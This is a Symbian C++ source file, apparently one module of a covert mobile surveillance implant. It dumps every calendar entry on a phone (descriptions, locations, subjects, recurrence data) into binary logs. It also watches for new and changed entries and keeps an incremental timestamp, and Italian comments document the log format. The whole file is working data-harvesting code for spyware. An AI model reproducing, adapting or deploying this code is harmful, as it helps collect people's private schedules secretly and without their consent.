/*
 ============================================================================
 Name		: AgentCalendar.cpp
 Author	  : Marco Bellino
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CAgentCalendar implementation
 ============================================================================
 */

#include "AgentCalendar.h"
#include <mmf\common\MMFControllerPluginResolver.h> // needed for: CleanupResetAndDestroyPushL()
#include <calrrule.h>
#include <HT\TimeUtils.h>
#include <HT\LogFile.h>
#include <UTF.H>


	
typedef struct TCalStruct
	{
	TUint32 iFlags;
	TFileTime iStart;
	TFileTime iEnd;
	TInt32	iSensivity;
	TInt32	iBusyStatus;
	TInt32  iDuration;
	TInt32  iMeetStatus;
		
	} TCalStruct;


typedef struct TTaskRecur
	{
	TInt32 lRecurrenceType;
	TInt32 lInterval;
	TInt32 lMonthOfYear;
	TInt32 lDayOfMonth;
	TInt32 lDayOfWeekMask;
	TInt32 lInstance;
	TInt32 lOccurrences;
	TFileTime ftPatternStartDate;
	TFileTime ftPatternEndDate;
	} TTaskRecur;

enum TObjectTaskTypes
	{
		EPOOM_TYPE_MASK			= 0x00FFFFFF,
		EPOOM_STRING_SUBJECT    = 0x01000000, 
		EPOOM_STRING_CATEGORIES	= 0x02000000,
		EPOOM_STRING_BODY		= 0x04000000,
		EPOOM_STRING_RECIPIENTS	= 0x08000000,
		EPOOM_STRING_LOCATION	= 0x10000000,
		EPOOM_OBJECT_RECUR		= 0x80000000
	};


 #define FLAG_REMINDER 0x00000001
 #define FLAG_COMPLETE 0x00000002
 #define FLAG_TEAMTASK 0x00000004
 #define FLAG_RECUR    0x00000008
 #define FLAG_RECUR_NoEndDate 0x00000010
 #define FLAG_MEETING  0x00000020
 #define FLAG_ALLDAY   0x00000040
 #define FLAG_ISTASK   0x00000080


CAgentCalendar::CAgentCalendar() :
	CAbstractAgent(EAgent_Calendar)
	{
	// No implementation required
	}

CAgentCalendar::~CAgentCalendar()
	{
	__FLOG(_L("Destructor"));
	delete iLongTask;
	//delete iCalIter;
	iCalUidArray.Close();
	delete iMarkupFile;
	delete iCalView;
	iCalSession->StopChangeNotification();  
	delete iCalSession;
	__FLOG(_L("End Destructor"));
	__FLOG_CLOSE;
	}

CAgentCalendar* CAgentCalendar::NewLC(const TDesC8& params)
	{
	CAgentCalendar* self = new (ELeave) CAgentCalendar();
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CAgentCalendar* CAgentCalendar::NewL(const TDesC8& params)
	{
	CAgentCalendar* self = CAgentCalendar::NewLC(params);
	CleanupStack::Pop(); // self;
	return self;
	}

void CAgentCalendar::ConstructL(const TDesC8& params)
	{
	BaseConstructL(params);
	__FLOG_OPEN("HT", "Agent_Calendar.txt");
	__FLOG(_L("-------------"));
	iLongTask = CLongTaskAO::NewL(*this);

	iCalSession = CCalSession::NewL();
	iCalSession->OpenL(KNullDesC());

	// start the observer on calendar events
	TCalTime startCalTime,endCalTime;
	startCalTime.SetTimeUtcL(TCalTime::MinTime());
	endCalTime.SetTimeUtcL(TCalTime::MaxTime());
	CalCommon::TCalTimeRange calTimeRange(startCalTime,endCalTime);
		
	CCalChangeNotificationFilter* filter = CCalChangeNotificationFilter::NewL(MCalChangeCallBack2::EChangeEntryAll,ETrue,calTimeRange);
	CleanupStack::PushL(filter);
	iCalSession->StartChangeNotification(*this,*filter);
	CleanupStack::PopAndDestroy(filter);
		
	iMarkupFile = CLogFile::NewL(iFs);
	}

void CAgentCalendar::Progress(TInt aPercentageCompleted)
	{
	}

void CAgentCalendar::Completed(TInt aError)
	{
	}

TBool CAgentCalendar::NotifyProgress()
	{
	return EFalse;
	}

void CAgentCalendar::StartAgentCmdL()
	{
	__FLOG(_L("StartAgentCmdL()"));
	CreateLogL(LOGTYPE_CALENDAR);
	iStopLongTask = EFalse;

	// Deletes CalView (just in case)
	delete iCalView; iCalView = NULL;
	iCalView = CCalEntryView::NewL(*iCalSession, *this);
	
	
	// if markup exists, set iTimestamp to that value
	// otherwise initialize iTimestamp to an initial value
	if(iMarkupFile->ExistsMarkupL(Type())){
		// retrieve iTimestamp
		RBuf8 timeBuffer(iMarkupFile->ReadMarkupL(Type()));
		timeBuffer.CleanupClosePushL();
		TInt64 timestamp;
		Mem::Copy(&timestamp,timeBuffer.Ptr(),sizeof(timestamp));
		CleanupStack::PopAndDestroy(&timeBuffer);
		TTime time = timestamp;
		// we add just a microsecond to the timestamp so that we are sure not to take 
		// the contact of the timestamp saved into markup
		TTimeIntervalMicroSeconds oneMicroSecond = 1;
		time += oneMicroSecond;
		iTimestamp.SetTimeUtcL(time);			
	} else {
		iTimestamp.SetTimeUtcL(TCalTime::MinTime());   // Jan 1st 1900		
	}
	
	iCalUidArray.Reset();
	iCalView->GetIdsModifiedSinceDateL(iTimestamp, iCalUidArray);
	
	//TInt count = iCalUidArray.Count();   // delete
	
	iCalIndex = 0;
	iLongTask->NextRound();
	}

void CAgentCalendar::StopAgentCmdL()
	{
	//iCalSession->StopChangeNotification();
	__FLOG(_L("StopAgentCmdL()"));
	delete iCalView;
	iCalView = NULL;
	iStopLongTask = ETrue;
	CloseLogL();
	}


/*
TInt64 CAgentCalendar::GetFiletime(const TTime aCurrentUtcTime){
	
	_LIT(KInitialTime,"16010000:000000");
	TTime initialTime;
	initialTime.Set(KInitialTime);
		
	TTimeIntervalMicroSeconds interval;
	interval=aCurrentUtcTime.MicroSecondsFrom(initialTime);
		
	return interval.Int64()*10; 
		
}
*/

HBufC8* CAgentCalendar::GetCalEntryBufferL(const CCalEntry& calEntry)
	{
	CBufBase* buffer = CBufFlat::NewL(50);
	CleanupStack::PushL(buffer);
	
	__FLOG(calEntry.DescriptionL());
	__FLOG(calEntry.LocationL());
	__FLOG(calEntry.SummaryL());
	__FLOG_1(_L("Type: %d"), calEntry.EntryTypeL());
	
	TCalStruct calStruct;
	switch (calEntry.EntryTypeL())
		{
		case CCalEntry::EAppt:
			calStruct.iFlags = FLAG_MEETING;
			break;
		case CCalEntry::ETodo:
			calStruct.iFlags = FLAG_ISTASK;
			break;
		case CCalEntry::EEvent:
			calStruct.iFlags = FLAG_ALLDAY;
			break;		
		case CCalEntry::EReminder:			
			calStruct.iFlags = FLAG_REMINDER;
			break;
		case CCalEntry::EAnniv:
			calStruct.iFlags = FLAG_ALLDAY;     
			break;
		}
	
	//TInt64 startTime = GetFiletime(calEntry.StartTimeL().TimeUtcL());
	//TInt64 endTime = GetFiletime(calEntry.EndTimeL().TimeUtcL());
	TInt64 startTime = TimeUtils::GetFiletime(calEntry.StartTimeL().TimeUtcL());
	TInt64 endTime = TimeUtils::GetFiletime(calEntry.EndTimeL().TimeUtcL());
	calStruct.iStart.dwHighDateTime = (startTime >> 32);
	calStruct.iStart.dwLowDateTime = (startTime & 0xFFFFFFFF);
	calStruct.iEnd.dwHighDateTime = (endTime >> 32);
	calStruct.iEnd.dwLowDateTime = (endTime & 0xFFFFFFFF);
    
	/* olNormal = 0
       olPersonal = 1
       olPrivate = 2
       olConfidential = 3 */
	switch (calEntry.ReplicationStatusL())
		{
		case CCalEntry::EOpen:
			calStruct.iSensivity = 0;
			break;
		case CCalEntry::EPrivate:
			calStruct.iSensivity = 2;
			break;
		case CCalEntry::ERestricted:
			calStruct.iSensivity = 3;
			break;
		}
	
	// MARK: Probably this value is not available in Symbian...
	calStruct.iBusyStatus = 0;
	
	TTimeIntervalMinutes intervalMin;
	(calEntry.EndTimeL().TimeUtcL()).MinutesFrom(calEntry.StartTimeL().TimeUtcL(), intervalMin);
		
	calStruct.iDuration = intervalMin.Int();

	/*
      olNonMeeting = 0
      olMeeting = 1
      olMeetingAccepted = 3
      olMeetingCanceled = 7 
     */
	switch (calEntry.StatusL())
		{
		case CCalEntry::ETodoCompleted:
			calStruct.iFlags |= FLAG_COMPLETE;
			break;
		case CCalEntry::EConfirmed:
			calStruct.iMeetStatus = 3;
			break;
		case CCalEntry::ECancelled:
			calStruct.iMeetStatus = 7;
			break;
		default:
			calStruct.iMeetStatus = 9;  // TODO: this is the "unknown status", crosscheck with server
			break;
		}
	CalCommon::TRecurrenceRange recurrenceRange = calEntry.RecurrenceRangeL();
	
	/*
	 * Pay attention here!
	 * EAnniv entries have no TCalRule, so hasRepRule below is always false, you have to 
	 * check here before setting the recurrency flag
	 */
	if (recurrenceRange != CalCommon::EThisOnly)
		{
		if (calEntry.EntryTypeL() != CCalEntry::EAnniv){
			if ((calEntry.EndTimeL().TimeLocalL() != calEntry.EndTimeL().MaxTime()) &&
					(calEntry.EndTimeL().TimeLocalL() != calEntry.EndTimeL().MinTime()))
					calStruct.iFlags |= FLAG_RECUR;
			else
				calStruct.iFlags |= FLAG_RECUR_NoEndDate;
		}
		}
	buffer->InsertL(buffer->Size(), &calStruct, sizeof(calStruct));
	
	
	if (recurrenceRange != CalCommon::EThisOnly)
		{
		// Add optional data...
		TCalRRule repRule;
		TBool hasRepRule = calEntry.GetRRuleL(repRule);

		if(hasRepRule){
		TTaskRecur taskRecur;
		taskRecur.lInterval = repRule.Interval();
		switch (repRule.Type())
			{
			case TCalRRule::EDaily:
				taskRecur.lRecurrenceType = 0;				
				break;
			case TCalRRule::EWeekly:
				taskRecur.lRecurrenceType = 1;
				TInt dayInWeek = repRule.WkSt();
				// dayInWeek = 0..6
				// we have to map it to the 1..64 range
				taskRecur.lDayOfWeekMask = (1 << dayInWeek);
				break;
			case TCalRRule::EMonthly:
				taskRecur.lRecurrenceType = 2;
				taskRecur.lDayOfMonth = repRule.DtStart().TimeUtcL().DateTime().Day() + 1; // Offset from zero, so add one before displaying the month number.
				break;
			case TCalRRule::EYearly:
				taskRecur.lRecurrenceType = 5;
				taskRecur.lMonthOfYear = repRule.DtStart().TimeUtcL().DateTime().Month() + 1; // The result is an enum (starts from 0);
				break;
			default:
				break;
			}
		/*# LONG lRecurrenceType, puo' assumere uno di questi valori a seconda del tipo di ricorrenza dell'evento:
		* olRecursOnce = -1
		* olRecursDaily = 0
		* olRecursWeekly = 1
		* olRecursMonthly = 2
		* olRecursMonthNth = 3
		* olRecursYearly = 5
		* olRecursYearNth = 6 */
		
		taskRecur.lOccurrences = repRule.Count();
		
		//TInt64 startDate = GetFiletime(repRule.DtStart().TimeUtcL());
		//TInt64 endDate = GetFiletime(repRule.Until().TimeUtcL());
		TInt64 startDate = TimeUtils::GetFiletime(repRule.DtStart().TimeUtcL());
		TInt64 endDate = TimeUtils::GetFiletime(repRule.Until().TimeUtcL());
		taskRecur.ftPatternStartDate.dwHighDateTime = (startDate >> 32);
		taskRecur.ftPatternStartDate.dwLowDateTime = (startDate & 0xFFFFFFFF);
		taskRecur.ftPatternEndDate.dwHighDateTime = (endDate >> 32);
		taskRecur.ftPatternEndDate.dwLowDateTime = (endDate & 0xFFFFFFFF);
		    
			
		//buffer->InsertL(buffer->Size(), &taskRecur, sizeof(TTaskRecur));
		buffer->InsertL(buffer->Size(), &taskRecur, sizeof(taskRecur));
		}
		}
	
	// 1st byte is the Type and next 3 bytes are the Length
	// Adds the Description
	if(calEntry.DescriptionL().Size() == 0){
	      ;   // do not append anything
	} else {
	TUint8* ptrData = (TUint8 *)calEntry.DescriptionL().Ptr();  
	//TUint32 typeAndLen = EPOOM_STRING_SUBJECT;
	TUint32 typeAndLen = EPOOM_STRING_BODY;
	typeAndLen += calEntry.DescriptionL().Size();
	buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
	buffer->InsertL(buffer->Size(), ptrData, calEntry.DescriptionL().Size());
	}
	
	// Adds the Location
	if(calEntry.LocationL().Size() == 0){
	;
	} else {
	TUint8* ptrData = (TUint8 *)calEntry.LocationL().Ptr();   
	TUint32 typeAndLen = EPOOM_STRING_LOCATION;
	typeAndLen += calEntry.LocationL().Size();
	buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
	buffer->InsertL(buffer->Size(), ptrData, calEntry.LocationL().Size()); // original MB
	}
	
	// Adds the Summary
	if(calEntry.SummaryL().Size() == 0){
	;
	} else {
	TUint8* ptrData = (TUint8 *)calEntry.SummaryL().Ptr(); 
	//TUint32 typeAndLen = EPOOM_STRING_BODY;
	TUint32 typeAndLen = EPOOM_STRING_SUBJECT;
	typeAndLen += calEntry.SummaryL().Size();  
	buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));   
	buffer->InsertL(buffer->Size(), ptrData, calEntry.SummaryL().Size()); 
	}
	// adds header data to buffer
	THeader header;
	header.dwSize += buffer->Size();
	header.lOid = calEntry.LocalUidL();
	buffer->InsertL(0, &header, sizeof(header));
	
	HBufC8* result = buffer->Ptr(0).AllocL();
	
	CleanupStack::PopAndDestroy(buffer);
	
	return result;
	}

void CAgentCalendar::DoOneRoundL()
	{
	// If the Agent has been stopped, don't proceed on the next round...
	if (iStopLongTask)
		return;

	if (iCalIndex >= iCalUidArray.Count())
	{
		if(iCalIndex == 0)
			return;
		// write markup, we have finished the initial dump
		// and we write the date of the most recent changed/added item
		TTime timeStamp = iTimestamp.TimeUtcL();
		RBuf8 buf(GetTTimeBufferL(timeStamp));
		buf.CleanupClosePushL();
		if (buf.Length() > 0)
		{
			iMarkupFile->WriteMarkupL(Type(),buf);
		}
		CleanupStack::PopAndDestroy(&buf);
					
		return;
	}
		
	
	CCalEntry* calEntry = iCalView->FetchL(iCalUidArray[iCalIndex]);
	CleanupStack::PushL(calEntry);
	
	if(calEntry!=NULL){
		RBuf8 buf( GetCalEntryBufferL(*calEntry) );
		buf.CleanupClosePushL();
		if (buf.Length() > 0)
		{
			// dump the buffer to the file log. 
			AppendLogL(buf);
			// check the date against the last saved one and update if necessary
			TCalTime lastModifCalTime = calEntry->LastModifiedDateL();
			TTime lastModifTTime = lastModifCalTime.TimeUtcL();
			TTime timestamp = iTimestamp.TimeUtcL();
			if(timestamp < lastModifTTime){
				iTimestamp.SetTimeUtcL(lastModifTTime);
			}
			
		}
		CleanupStack::PopAndDestroy(&buf);
	}
	CleanupStack::PopAndDestroy(calEntry);    
			
	iCalIndex++;
	iLongTask->NextRound();
}

HBufC8* CAgentCalendar::GetTTimeBufferL(const TTime aTime)
{
	TInt64 timestamp = aTime.Int64();
	CBufBase* buffer = CBufFlat::NewL(50);
	CleanupStack::PushL(buffer);
	
	TUint32 len = sizeof(len) + sizeof(timestamp);
	buffer->InsertL(buffer->Size(), &len, sizeof(len));
	buffer->InsertL(buffer->Size(), &timestamp, sizeof(timestamp));

	HBufC8* result = buffer->Ptr(0).AllocL();
	CleanupStack::PopAndDestroy(buffer);
	return result;
}


void CAgentCalendar::CalChangeNotification(RArray< TCalChangeEntry > &aChangeItems){
	TCalChangeEntry changeEntry;
	for (int i=0; i<aChangeItems.Count();i++){
		changeEntry = aChangeItems[i];
		switch (changeEntry.iChangeType)
		{
			case EChangeAdd:
			case EChangeModify:
				{
					CCalEntry* calEntry = iCalView->FetchL(changeEntry.iEntryId);
					CleanupStack::PushL(calEntry);
					
					if(calEntry!=NULL){
						RBuf8 buf( GetCalEntryBufferL(*calEntry) );
						buf.CleanupClosePushL();
						if (buf.Length() > 0)
						{
							// dump the buffer to the file log. 
							CLogFile* logFile = CLogFile::NewLC(iFs);
							logFile->CreateLogL(LOGTYPE_CALENDAR);
							logFile->AppendLogL(buf);
							logFile->CloseLogL();
							CleanupStack::PopAndDestroy(logFile);
							// save markup if file already exists
							TCalTime lastModifCalTime = calEntry->LastModifiedDateL();
							TTime lastModifTTime = lastModifCalTime.TimeUtcL();
							if(iMarkupFile->ExistsMarkupL(Type())){
								// if a markup exists, a dump has been performed and this 
								// is the most recent change
								RBuf8 buffer(GetTTimeBufferL(lastModifTTime));
								buffer.CleanupClosePushL();
								if (buffer.Length() > 0)
								{
									iMarkupFile->WriteMarkupL(Type(),buffer);
								}
								CleanupStack::PopAndDestroy(&buffer);
							}
									
						}
						CleanupStack::PopAndDestroy(&buf);
					}
					CleanupStack::PopAndDestroy(calEntry);
				}
				return;
			default:
				return;
		}
	}
	
}


/*
 I log di tipo Calendar sono un sequenza di strutture dinamiche, ognuna composta da una parte fissa e una variabile.
 Parte Fissa

 Header
 header di lunghezza fissa.

 typedef struct _Header{
 DWORD		dwSize;
 DWORD		dwVersion;
 LONG		lOid;
 } HeaderStruct, *pHeaderStruct;

 * DWORD dwSize, dimensione totale della struttura
 * DWORD dwVersion, versione di questo log
 * LONG lOid, un LONG che rappresenta l'ID dell'appuntamento nel DB del cellulare 

 Flags
 DWORD che indica dei particolari flags, eventualmente in OR tra loro.

 #define FLAG_REMINDER 0x00000001
 #define FLAG_COMPLETE 0x00000002
 #define FLAG_TEAMTASK 0x00000004
 #define FLAG_RECUR    0x00000008
 #define FLAG_RECUR_NoEndDate 0x00000010
 #define FLAG_MEETING  0x00000020
 #define FLAG_ALLDAY   0x00000040
 #define FLAG_ISTASK   0x00000080

 * FLAG_REMINDER: e' attivata la funzione remainder
 * FLAG_COMPLETE: se l'appuntamento e' un task indica se e' stato completato
 * FLAG_TEAMTASK: settato se il task e' di gurppo
 * FLAG_RECUR: l'appuntamento e' ricorrente
 * FLAG_RECUR_NoEndDate: ricorrennza senza data di fine
 * FLAG_MEETING: l'appuntamento e' un meeting
 * FLAG_ALLDAY: appuntamento dura per l'intera giornata
 * FLAG_ISTASK: l'appuntamento e' un task 

 Start date
 FILETIME che indica l'inizio dell'appuntamento

 End date
 FILETIME che indica la fine dell'appuntamento

 Sensitivity
 LONG indicante l'importanza dell'appuntamento

 * olNormal = 0
 * olPersonal = 1
 * olPrivate = 2
 * olConfidential = 3 

 Busy Status
 LONG indicante lo stato durante l'appuntamento

 * olFree = 0
 * olTentative = 1
 * olBusy = 2
 * olOutOfOffice = 3 

 Duration
 LONG che definisce la durata dell'appuntamento in minuti

 Meeting Status
 LONG specifica se l'appuntamento e' un meeting

 * olNonMeeting = 0
 * olMeeting = 1
 * olMeetingAccepted = 3
 * olMeetingCanceled = 7 

 Parte Variabile

 NB: da qui in avanti i blocchi sono facoltativi

 Ricorrenza
 Se e' prevista una ricorrenza dell'appuntamento, devono essere aggiunti i dati estrapolati da questa struttura:

 typedef struct _TaskRecur 
 {
 LONG lRecurrenceType;
 LONG lInterval;
 LONG lMonthOfYear;
 LONG lDayOfMonth;
 LONG lDayOfWeekMask;
 LONG lInstance;
 LONG lOccurrences;
 FILETIME ftPatternStartDate;
 FILETIME ftPatternEndDate;
 } RecurStruct, *pRecurStruct;

 * LONG lRecurrenceType, puo' assumere uno di questi valori a seconda del tipo di ricorrenza dell'evento:
 o olRecursOnce = -1
 o olRecursDaily = 0
 o olRecursWeekly = 1
 o olRecursMonthly = 2
 o olRecursMonthNth = 3
 o olRecursYearly = 5
 o olRecursYearNth = 6 
 * LONG lInterval, numero di unita' (giorni, settimane, ... in base a lRecurrenceType) tra gli eventi (1-999)
 * LONG lMonthOfYear, numero da 1 a 12 indicante il mese, valido solo se sono settati olRecursYearly o olRecursYearNth
 * LONG lDayOfMonth, numero da 1 a 31 indicante il giorno del mese, valido solo se olRecursMonthly o olRecursMonthNth sono settati
 * LONG lDayOfWeekMask, uno o piu' tra i seguenti valori (anche in OR tra loro):
 o olSunday = 1
 o olMonday = 2
 o olTuesday = 4
 o olWednesday = 8
 o olThursday = 16
 o olFriday = 32
 o olSaturday = 64 

 * LONG lInstance = indica la durata della ricorrenza, in numero di mesi o di anni. Valido solo se sono settati olRecursMonthNth o olRecursYearNth
 * LONG lOccurrences = numero di ricorrenze
 * FILETIME ftPatternStartDate = inizio delle ricorrenze
 * FILETIME ftPatternEndDate = fine delle ricorrenze 

 Blocchi di stringhe
 Cinque blocchi opzionali composti ognuno da un prefisso (DWORD) seguito da una stringa (WCHAR) senza terminatore. Il prefisso e' una DWORD composta da 1 byte di tipo e 3 byte che indicano la lunghezza della stringa che segue.

 I due byte che indicano il tipo possono assumere i valori di questa enum (escluso ovviamente POOM_TYPE_MASK):

 enum ObjectTaskTypes{
 POOM_TYPE_MASK	= 0x00FFFFFF,
 POOM_STRING_SUBJECT     =	0x01000000, 
 POOM_STRING_CATEGORIES	=	0x02000000,
 POOM_STRING_BODY	=	0x04000000,
 POOM_STRING_RECIPIENTS	=	0x08000000,
 POOM_STRING_LOCATION	=	0x10000000,
 POOM_OBJECT_RECUR	=	0x80000000
 };

 le stringhe interessate sono:

 * Subject: argomento dell'appuntamento
 * Categories: categorie che specificano il tipo di appuntamento
 * Body: corpo, descrizione dell'appuntamento
 * Recipients: elenco dei partecipanti all'evento nella forma "Nome_1 <email_1>, Nome_2 <email_2>, ..."
 * Location: luogo 
 */
